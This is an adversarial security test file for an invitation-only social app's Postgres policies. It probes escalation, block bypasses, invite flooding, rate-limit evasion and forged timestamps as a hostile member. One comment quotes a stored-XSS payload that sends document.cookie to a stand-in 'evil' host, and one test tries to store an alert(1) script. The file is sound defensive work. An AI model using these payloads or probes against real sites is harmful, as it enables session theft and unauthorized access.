/**
 * Security audit — the adversarial suite.
 *
 * ── How this differs from the other suites ───────────────────────────────────
 *
 * Every other test file asks "does the feature work". This one asks "what can a
 * signed-in member do that they should not", and it asks by trying, as the real
 * `authenticated` role, against the real policies.
 *
 * The threat model is a member of the room whose account is compromised, or who
 * has turned malicious. That is the realistic attacker for an invitation-only
 * app: not a stranger — there is no way in — but somebody who is already inside
 * and now has a browser console and the anon key, which is public by design.
 *
 * So every probe below is written from inside a session. If a probe succeeds,
 * that is a finding.
 *
 *     npm run security:test
 */

import { register } from "node:module";
import { join } from "node:path";
import { pathToFileURL } from "node:url";

import { asService, asUser, asUserAtAal, createUser, freshDatabase } from "./harness.mjs";

register(pathToFileURL(join(import.meta.dirname, "alias-loader.mjs")).href);

let passed = 0;
let failed = 0;
const failures = [];

const ok = (n) => {
  passed += 1;
  console.log(`  ✓ ${n}`);
};
const bad = (n, d) => {
  failed += 1;
  failures.push(`${n} — ${d}`);
  console.log(`  ✗ ${n}\n      ${d}`);
};
const eq = (n, a, e) =>
  JSON.stringify(a) === JSON.stringify(e)
    ? ok(n)
    : bad(n, `expected ${JSON.stringify(e)}, got ${JSON.stringify(a)}`);
const truthy = (n, v, d = "expected a truthy value") => (v ? ok(n) : bad(n, d));
const section = (t) => console.log(`\n${t}`);

/**
 * An attack that must not work.
 *
 * A refusal is either a raise or an empty result. RLS denies a READ by returning
 * no rows rather than by erroring — which is correct, since erroring would
 * confirm the row exists — so both have to count as a refusal.
 *
 * ── The trap in that, which this helper fell into first ──────────────────────
 *
 * A successful INSERT also returns zero rows. The first version of this checked
 * `rows.length === 0` and therefore reported every write that LANDED as a write
 * that was refused: "cannot mint an invite code" passed green while the insert
 * succeeded.
 *
 * So `affectedRows` is checked as well, and a write probe that comes back having
 * changed something is a finding no matter how few rows it returned.
 */
async function blocked(name, promise) {
  try {
    const result = await promise;
    const rows = result?.rows ?? [];
    const affected = result?.affectedRows ?? 0;

    if (rows.length > 0) {
      bad(name, `THE ATTACK SUCCEEDED — read ${JSON.stringify(rows).slice(0, 160)}`);
      return;
    }
    if (affected > 0) {
      bad(name, `THE ATTACK SUCCEEDED — wrote ${affected} row(s)`);
      return;
    }

    ok(name);
  } catch {
    ok(name);
  }
}

console.log("KITH — security audit\n");

const db = await freshDatabase();

const ada = await createUser(db, "ada");
const mallory = await createUser(db, "mallory");
const rafa = await createUser(db, "rafa");

const pair = (a, b) => [a < b ? a : b, a < b ? b : a];
const NOBODY = "00000000-0000-0000-0000-000000000000";

// Ada and Rafa are friends and talk. Mallory is a member of the room — invited,
// signed in, and hostile — but has no relationship with either of them.
await asService(
  db,
  "insert into public.friendships (user_low, user_high) values ($1,$2)",
  pair(ada, rafa),
);

const { rows: conv } = await asUser(db, ada, "select public.start_dm($1) as id", [rafa]);
const dm = conv[0].id;

await asService(
  db,
  "insert into public.messages (conversation_id, sender_id, body) values ($1,$2,'something private')",
  [dm, ada],
);

/* ==========================================================================
 * 1 · Privilege escalation through SECURITY DEFINER
 * ========================================================================== */

section("Privilege escalation");

{
  /*
   * The functions that take a subject as a PARAMETER rather than reading
   * `auth.uid()`. Each is safe only because `authenticated` cannot execute it —
   * so each is tried directly, which is what a browser console would do.
   */
  await blocked(
    "cannot commit a game move as another player",
    asUser(
      db,
      mallory,
      "select public.commit_game_move($1, $2, 1, '{}'::jsonb, '{}'::jsonb, null::smallint)",
      [NOBODY, ada],
    ),
  );
  await blocked(
    "cannot start a game session directly",
    asUser(db, mallory, "select public.start_game_session($1, $2, '{}'::jsonb, null::smallint)", [
      NOBODY,
      ada,
    ]),
  );
  await blocked(
    "cannot anonymise somebody else's account",
    asUser(db, mallory, "select public.anonymise_account($1)", [ada]),
  );
  await blocked(
    "cannot anonymise their own either — it is not a client-reachable RPC",
    asUser(db, mallory, "select public.anonymise_account($1)", [mallory]),
  );
  await blocked(
    "cannot record an invite redemption",
    asUser(db, mallory, "select public.record_invite_redemption($1, $2)", [NOBODY, mallory]),
  );
  /*
   * FINDING 5, fixed in 0028. Each is an unbounded UPDATE that was granted to
   * `authenticated` by reflex; every caller is SECURITY DEFINER and runs as the
   * owner, so none of them needed it.
   */
  for (const sweeper of ["abandon_stale_games", "expire_ringing_calls", "expire_abandoned_calls"]) {
    await blocked(
      `cannot run the ${sweeper} sweeper`,
      asUser(db, mallory, `select public.${sweeper}()`),
    );
  }

  /*
   * FINDING 1, fixed in 0028.
   *
   * `user_settings` is strictly own-row, but `notification_enabled` took a user
   * id as a parameter, read that person's `notification_prefs`, and was granted
   * to `authenticated`. One boolean per call, seven kinds — a member could read
   * out another member's settings a bit at a time, through the one door the
   * policy did not cover.
   */
  await asService(
    db,
    `update public.user_settings set notification_prefs = '{"message": false}'::jsonb
      where user_id = $1`,
    [ada],
  );
  await blocked(
    "cannot read another member's notification settings through the gate function",
    asUser(db, mallory, "select public.notification_enabled($1, 'message') as leaked", [ada]),
  );
  await blocked(
    "and still cannot read the column",
    asUser(db, mallory, "select notification_prefs from public.user_settings where user_id = $1", [
      ada,
    ]),
  );
}

{
  /*
   * The generic version of the same question, so a function added next year is
   * caught without anybody remembering to add a probe.
   *
   * Every function `authenticated` may execute is enumerated from the catalogue,
   * and any that takes a user-shaped parameter must consult `auth.uid()` in its
   * body. A function that trusts a caller-supplied identity and is reachable
   * from a session is a privilege escalation by construction.
   */
  const { rows } = await asService(
    db,
    `select p.proname,
            pg_get_function_arguments(p.oid) as args,
            pg_get_functiondef(p.oid) as def
       from pg_proc p
       join pg_namespace n on n.oid = p.pronamespace
      where n.nspname = 'public'
        and p.prokind = 'f'
        and has_function_privilege('authenticated', p.oid, 'EXECUTE')`,
  );

  const trusting = rows
    .filter((r) => /p_user_id|p_actor|p_reporter_id|\buser_id uuid/.test(r.args))
    .filter((r) => !/auth\.uid\(\)/.test(r.def))
    .map((r) => `${r.proname}(${r.args})`);

  eq("no session-callable function trusts a user id from its caller", trusting, []);

  truthy("and there are functions to check", rows.length > 20);
}

/* ==========================================================================
 * 2 · Writing rows that decide who you are
 * ========================================================================== */

section("Authorization tables");

{
  // Befriending yourself to somebody is the shortest path to every "friends"
  // gate in the app: messaging, calling, couple proposals, discoverability.
  await blocked(
    "cannot insert a friendship",
    asUser(
      db,
      mallory,
      "insert into public.friendships (user_low, user_high) values ($1,$2)",
      pair(mallory, ada),
    ),
  );
  await blocked(
    "cannot accept a request addressed to somebody else",
    asUser(
      db,
      mallory,
      "update public.friend_requests set status = 'accepted' where addressee_id = $1",
      [ada],
    ),
  );

  // Joining a conversation is the shortest path to reading it.
  await blocked(
    "cannot add themselves to a conversation",
    asUser(
      db,
      mallory,
      "insert into public.conversation_members (conversation_id, user_id) values ($1,$2)",
      [dm, mallory],
    ),
  );
  await blocked(
    "and therefore cannot read it",
    asUser(db, mallory, "select body from public.messages where conversation_id = $1", [dm]),
  );

  await blocked(
    "cannot join a call",
    asUser(db, mallory, "insert into public.call_participants (call_id, user_id) values ($1,$2)", [
      NOBODY,
      mallory,
    ]),
  );

  await blocked(
    "cannot become somebody's partner",
    asUser(
      db,
      mallory,
      "insert into public.couples (user_low, user_high, proposed_by, status) values ($1,$2,$3,'active')",
      [...pair(mallory, ada), mallory],
    ),
  );

  /*
   * Minting an invitation in your OWN name is the feature — every member may
   * invite. The first version of this probe asserted the opposite and passed
   * green, because a successful INSERT returns no rows and the helper read that
   * as a refusal. What must be refused is minting one in somebody else's name,
   * which is what would let a member launder an invitation through another
   * account's audit trail.
   */
  await blocked(
    "cannot mint an invite code in another member's name",
    asUser(
      db,
      mallory,
      "insert into public.invite_codes (code_hash, created_by) values ('forged', $1)",
      [ada],
    ),
  );

  const { rows: own } = await asUser(
    db,
    mallory,
    "insert into public.invite_codes (code_hash, created_by) values ('own', $1) returning id",
    [mallory],
  );
  truthy("but may mint their own, which is the point of an invitation", own.length === 1);
}

{
  // Identity itself.
  await blocked(
    "cannot rename another member",
    asUser(db, mallory, "update public.profiles set display_name = 'Ada?' where id = $1", [ada]),
  );
  await blocked(
    "cannot read another member's settings",
    asUser(db, mallory, "select * from public.user_settings where user_id = $1", [ada]),
  );
  await blocked(
    "cannot write them",
    asUser(db, mallory, "update public.user_settings set discoverable = true where user_id = $1", [
      ada,
    ]),
  );
  await blocked(
    "cannot forge an audit entry",
    asUser(
      db,
      mallory,
      "insert into public.security_events (user_id, event) values ($1, 'mfa.enabled')",
      [ada],
    ),
  );
  await blocked(
    "cannot dismiss a report filed about them",
    asUser(db, mallory, "update public.reports set status = 'dismissed'"),
  );
  await blocked(
    "cannot read who reported them",
    asUser(db, mallory, "select reporter_id from public.reports"),
  );
}

{
  // The auth schema is not the application's to read.
  await blocked("cannot read auth.users", asUser(db, mallory, "select email from auth.users"));
  await blocked(
    "cannot read MFA factors",
    asUser(db, mallory, "select secret from auth.mfa_factors"),
  );
  await blocked("cannot read sessions", asUser(db, mallory, "select id from auth.sessions"));
}

/* ==========================================================================
 * 3 · Cheating at the games
 * ========================================================================== */

section("Game integrity");

const { rows: gameRows } = await asUser(
  db,
  ada,
  "select public.create_game_session($1, 'would-you-rather') as id",
  [dm],
);
const game = gameRows[0].id;

// A session will not start until everybody seated is ready, so the fixture has
// to do what the lobby does.
await asUser(db, rafa, "select public.join_game_session($1)", [game]);
for (const player of [ada, rafa]) {
  await asUser(db, player, "select public.set_game_ready($1, true)", [game]);
}

await asService(db, "select public.start_game_session($1, $2, $3::jsonb, null::smallint)", [
  game,
  ada,
  JSON.stringify({ round: 0, secret: "the answer" }),
]);

{
  /*
   * Game state holds hidden information — who answered what, the word being
   * drawn, the subject's真 answer. If a player can read `state` the game is
   * over; if they can write it, so is the scoreboard.
   */
  await blocked(
    "a player cannot read the raw game state",
    asUser(db, ada, "select state from public.game_sessions where id = $1", [game]),
  );
  await blocked(
    "nor can a non-player",
    asUser(db, mallory, "select state from public.game_sessions where id = $1", [game]),
  );
  await blocked(
    "a player cannot write game state",
    asUser(
      db,
      ada,
      "update public.game_sessions set state = '{\"cheat\":true}'::jsonb where id = $1",
      [game],
    ),
  );
  await blocked(
    "nor award themselves points",
    asUser(db, ada, "update public.game_players set score = 999 where session_id = $1", [game]),
  );
  await blocked(
    "nor seat themselves in a game they are not in",
    asUser(
      db,
      mallory,
      "insert into public.game_players (session_id, user_id, seat) values ($1,$2,5)",
      [game, mallory],
    ),
  );
  await blocked(
    "and the move log does not leak the moves",
    asUser(db, ada, "select payload from public.game_moves"),
  );
}

/* ==========================================================================
 * 4 · Realtime channels
 * ========================================================================== */

section("Realtime");

{
  const { rows: canRead } = await asService(
    db,
    "select count(*)::int n from pg_policy where polrelid = 'realtime.messages'::regclass",
  );
  truthy("realtime.messages is governed by policy", canRead[0].n >= 6);

  /*
   * The personal bus carries call invitations, game invitations and each
   * player's private view of a game. It is read-only from a browser by design:
   * a write policy here would let anybody fake an incoming call, or hand a
   * player another player's hand.
   */
  const { rows: userWrites } = await asService(
    db,
    `select polname from pg_policy
      where polrelid = 'realtime.messages'::regclass
        and polcmd = 'a'
        and pg_get_expr(polwithcheck, polrelid) like '%user:%'`,
  );
  eq("nobody can broadcast into another member's personal channel", userWrites, []);
}

/* ==========================================================================
 * 5 · Blocking cannot be walked around
 * ========================================================================== */

section("Blocking");

await asUser(db, ada, "select public.block_user($1)", [mallory]);

{
  await blocked(
    "a blocked member cannot see the profile",
    asUser(db, mallory, "select id from public.profiles where id = $1", [ada]),
  );
  await blocked(
    "cannot find them in search",
    asUser(db, mallory, "select * from public.search_profiles('ada')"),
  );
  await blocked(
    "cannot send a friend request",
    asUser(
      db,
      mallory,
      "insert into public.friend_requests (requester_id, addressee_id) values ($1,$2)",
      [mallory, ada],
    ),
  );
  await blocked(
    "cannot start a conversation",
    asUser(db, mallory, "select public.start_dm($1)", [ada]),
  );
  await blocked(
    "cannot propose a couple",
    asUser(db, mallory, "select public.propose_couple($1)", [ada]),
  );
  await blocked(
    "and cannot see who blocked them",
    asUser(db, mallory, "select blocker_id from public.blocks"),
  );

  await asUser(db, ada, "select public.unblock_user($1)", [mallory]);
}

/* ==========================================================================
 * 6 · The two-factor gate
 * ========================================================================== */

section("Two-factor");

{
  /*
   * The gate that makes MFA real rather than a redirect. A password login yields
   * a working `aal1` token before any code is entered, and that token can be
   * pointed straight at PostgREST.
   */
  const { rows: factor } = await asService(
    db,
    `insert into auth.mfa_factors (user_id, status, secret) values ($1, 'verified', 's')
     returning id`,
    [rafa],
  );

  await blocked(
    "an enrolled member at aal1 can read nothing",
    asUser(db, rafa, "select id from public.profiles where id = $1", [rafa]),
  );
  const { rows: atAal2 } = await asUserAtAal(
    db,
    rafa,
    "aal2",
    "select id from public.profiles where id = $1",
    [rafa],
  );
  eq("and everything once the code is in", atAal2.length, 1);

  await asService(db, "delete from auth.mfa_factors where id = $1", [factor[0].id]);
}

/* ==========================================================================
 * 7 · The room stays closed
 * ========================================================================== */

section("Invitations");

{
  /*
   * FINDING 2, fixed in 0028.
   *
   * `invite_codes_insert_own` checked that a code was created in your own name
   * and nothing else. `max_uses` caps one code at 20 signups; nothing capped the
   * number of codes, so two hundred inserts in a loop all landed — four thousand
   * accounts, from one member, into a room whose whole premise is that there are
   * six people in it.
   *
   * Of everything in this file it is the finding that changes what the product
   * is, rather than what one member can see.
   */
  let minted = 0;
  for (let i = 0; i < 50; i += 1) {
    try {
      await asUser(
        db,
        mallory,
        "insert into public.invite_codes (code_hash, created_by, max_uses) values ($1,$2,20)",
        [`probe-${i}`, mallory],
      );
      minted += 1;
    } catch {
      break;
    }
  }

  truthy(
    `minting stops at ${minted} live invitations, not 50`,
    minted > 0 && minted <= 5,
    `${minted} codes accepted — the ceiling is not holding`,
  );

  // Revoking one frees a slot: the ceiling is on OUTSTANDING invitations, not on
  // invitations ever sent. Somebody who invites five people, watches them join
  // and invites five more is behaving normally.
  await asService(db, "update public.invite_codes set revoked_at = now() where created_by = $1", [
    mallory,
  ]);
  const { rows: again } = await asUser(
    db,
    mallory,
    "insert into public.invite_codes (code_hash, created_by) values ('after-revoke', $1) returning id",
    [mallory],
  );
  truthy("and revoking one frees a slot", again.length === 1);
}

/* ==========================================================================
 * 8 · Blocking cannot be undone by a third party
 * ========================================================================== */

section("Groups and blocking");

{
  /*
   * FINDING 4, fixed in 0028.
   *
   * `can_post_to_conversation` refuses if you are blocked with ANY other active
   * member of a thread — which is right on its own. But nothing stopped a member
   * adding a blocked person to a group, and the two rules together meant:
   *
   *     Ada is in a group and can post.
   *     Rafa adds Mallory, whom Ada has blocked.
   *     Ada can no longer post in her own group.
   *
   * A denial of service dressed as a feature, and a way to force contact on
   * somebody who had explicitly refused it — whether the person adding was
   * malicious or simply did not know.
   */
  await asService(
    db,
    "insert into public.friendships (user_low, user_high) values ($1,$2)",
    pair(mallory, rafa),
  );

  const { rows: groupRows } = await asUser(db, rafa, "select public.start_group($1,$2) as id", [
    "the room",
    [ada],
  ]);
  const group = groupRows[0].id;

  const canPost = async (who) => {
    const { rows } = await asUser(db, who, "select public.can_post_to_conversation($1) as yes", [
      group,
    ]);
    return rows[0].yes;
  };

  truthy("Ada can post in her group", await canPost(ada));

  await asUser(db, ada, "select public.block_user($1)", [mallory]);

  await blocked(
    "a third party cannot add somebody Ada has blocked",
    asUser(
      db,
      rafa,
      "insert into public.conversation_members (conversation_id, user_id) values ($1,$2)",
      [group, mallory],
    ),
  );

  truthy("so Ada keeps her group", await canPost(ada));

  // Symmetric: it is refused whichever direction the block runs.
  await asUser(db, ada, "select public.unblock_user($1)", [mallory]);
  await asUser(db, mallory, "select public.block_user($1)", [ada]);

  await blocked(
    "and cannot add somebody who has blocked a member",
    asUser(
      db,
      rafa,
      "insert into public.conversation_members (conversation_id, user_id) values ($1,$2)",
      [group, mallory],
    ),
  );

  await asUser(db, mallory, "select public.unblock_user($1)", [ada]);
}

/* ==========================================================================
 * 9 · Rate limits
 * ========================================================================== */

section("Rate limits");

{
  /*
   * The abuse a compromised account can commit without breaking a single
   * authorization rule: doing a permitted thing thousands of times.
   *
   * On a free-tier project that is a denial-of-service against the whole room —
   * the database fills, and every read slows down for everybody.
   */
  const flood = async (label, sql, params, attempts) => {
    let accepted = 0;
    for (let i = 0; i < attempts; i += 1) {
      try {
        await asUser(db, ada, sql, typeof params === "function" ? params(i) : params);
        accepted += 1;
      } catch {
        break;
      }
    }
    return { label, accepted };
  };

  /*
   * FINDING 3, fixed in 0028.
   *
   * Every authorization rule around messages was correct — member, not blocked,
   * is the sender. None of them said how MANY. A compromised account in a
   * legitimate conversation could insert rows until the project's storage ran
   * out, which on a free tier is a denial of service against all six people.
   */
  const messages = await flood(
    "messages",
    "insert into public.messages (conversation_id, sender_id, body) values ($1,$2,$3)",
    (i) => [dm, ada, `flood ${i}`],
    60,
  );

  truthy(
    `flooding stops after ${messages.accepted} messages in a minute`,
    messages.accepted < 60,
    `${messages.accepted} of 60 accepted — nothing is limiting the rate`,
  );

  // And the ceiling is high enough to be invisible. A fast typist in a heated
  // conversation sends perhaps ten a minute; a limit that caught them would be a
  // bug of its own.
  truthy(
    "but leaves room for somebody typing quickly",
    messages.accepted >= 25,
    `only ${messages.accepted} accepted — the limit is tight enough to hit a real person`,
  );

  /*
   * The ledger the limit counts. If a session can read it, it knows exactly how
   * much budget is left; if it can write it, the limit is theatre. It has RLS
   * on with no policies at all AND no grants, which are two independent reasons
   * for each of these to fail — the belt is deliberate, because a future
   * migration adding a policy by reflex should still find the door locked.
   */
  await blocked(
    "cannot read the rate-limit ledger",
    asUser(db, ada, "select * from public.rate_events"),
  );
  await blocked(
    "cannot clear the rate-limit ledger to buy more budget",
    asUser(db, ada, "delete from public.rate_events where user_id = $1", [ada]),
  );
  await blocked(
    "cannot backdate the rate-limit ledger either",
    asUser(db, ada, "update public.rate_events set at = '1970-01-01' where user_id = $1", [ada]),
  );
}

/* ==========================================================================
 * 10 · A session does not get to say when something happened
 * ========================================================================== */

section("Forged timestamps");

{
  /*
   * FINDING 6, fixed in 0028 — found by finding 3's own trigger breaking the
   * messaging suite, which is the only reason it was caught at all.
   *
   * `messages.created_at` has a default, and nothing stopped a session supplying
   * one instead. The app never does; the app is not what a member is bound by.
   *
   * Threads order by `created_at`, so a message dated in the far future sits
   * above everything anybody says afterwards for as long as the conversation
   * exists. Checked before the flood below, while Rafa still has budget.
   */
  const { rows: pinned } = await asUser(
    db,
    rafa,
    `insert into public.messages (conversation_id, sender_id, body, created_at)
     values ($1,$2,'pinned','3000-01-01') returning created_at`,
    [dm, rafa],
  );
  truthy(
    "a message cannot be pinned to the top of a thread with a future date",
    pinned[0].created_at.getUTCFullYear() < 2900,
    `stored as ${pinned[0].created_at.toISOString()} — the client chose its own place in the thread`,
  );

  /*
   * The worse half. The rate limit above counts rows `where created_at > now() -
   * 1 minute`. Backdate every insert and that count is always zero, so finding
   * 3's fix was decorative until this one existed — 500 messages went through a
   * limit of 30 when this was probed against the unfixed schema.
   */
  let backdated = 0;
  for (let i = 0; i < 200; i += 1) {
    try {
      await asUser(
        db,
        rafa,
        `insert into public.messages (conversation_id, sender_id, body, created_at)
         values ($1,$2,$3,'1970-01-01')`,
        [dm, rafa, `backdated ${i}`],
      );
      backdated += 1;
    } catch {
      break;
    }
  }

  truthy(
    `backdating buys no extra messages — stopped at ${backdated}`,
    backdated <= 30,
    `${backdated} accepted with a forged created_at — the rate limit is bypassable`,
  );

  /*
   * Fixtures and our own server code still control the clock deliberately: the
   * stamp applies to sessions, and there is no session behind a service-role
   * insert. The messaging suite's pagination fixture depends on this.
   *
   * The literal carries an explicit zone. Without one a `timestamptz` is read in
   * the session's TimeZone, and the first version of this assertion failed
   * because midnight local on 1 January is the previous year in UTC — a wrong
   * assertion rather than a wrong fix, but the two look identical from here.
   */
  const { rows: seeded } = await asService(
    db,
    `insert into public.messages (conversation_id, sender_id, body, created_at)
     values ($1,$2,'seeded','2020-06-01T12:00:00Z') returning created_at`,
    [dm, ada],
  );
  truthy(
    "but a fixture may still backdate, because no session wrote it",
    seeded[0].created_at.getUTCFullYear() === 2020,
  );
}

/* ==========================================================================
 * 11 · The one value that reaches a <script> tag
 * ========================================================================== */

section("Inline script interpolation");

{
  /*
   * `appearance-boot.tsx` interpolates the saved theme and motion settings into
   * an inline <script>, so the browser chrome matches the app before first
   * paint. It wraps both in `JSON.stringify`, which is the usual advice and is
   * NOT sufficient on its own: JSON.stringify does not escape `</script>`, and
   * a stored value containing one would close the tag and open another.
   *
   *     theme = '</script><script>fetch("//evil/"+document.cookie)</script>'
   *
   * It is safe here, but not because of the stringify — because `theme` and
   * `motion` are Postgres ENUMS, so the column cannot hold anything else and the
   * database refuses the write long before it reaches a page.
   *
   * That is a much stronger guarantee than escaping, and it is also invisible:
   * a future migration widening either column to `text` for flexibility would
   * turn a safe interpolation into stored XSS, in a file nobody edited. This
   * asserts the type, which is what the safety actually rests on.
   */
  for (const column of ["theme", "motion"]) {
    const { rows } = await asService(
      db,
      `select t.typtype
         from pg_attribute a
         join pg_class c on c.oid = a.attrelid
         join pg_namespace n on n.oid = c.relnamespace
         join pg_type t on t.oid = a.atttypid
        where n.nspname = 'public' and c.relname = 'user_settings' and a.attname = $1`,
      [column],
    );
    truthy(
      `user_settings.${column} is an enum, not free text — it reaches an inline <script>`,
      rows[0]?.typtype === "e",
      `it is typtype '${rows[0]?.typtype}' — JSON.stringify does not escape </script>`,
    );
  }

  // And the enum admits nothing else, checked rather than assumed.
  await blocked(
    "a script payload cannot be stored as a theme",
    asService(db, "update public.user_settings set theme = $1 where user_id = $2", [
      "</script><script>alert(1)</script>",
      ada,
    ]),
  );
}

await db.close();

/* ========================================================================== */

console.log(`\n${"=".repeat(60)}`);
console.log(`  ${passed} passed, ${failed} failed`);
if (failed > 0) {
  console.log("\n  Failures:");
  for (const f of failures) console.log(`    - ${f}`);
}
console.log(`${"=".repeat(60)}\n`);
process.exit(failed === 0 ? 0 : 1);
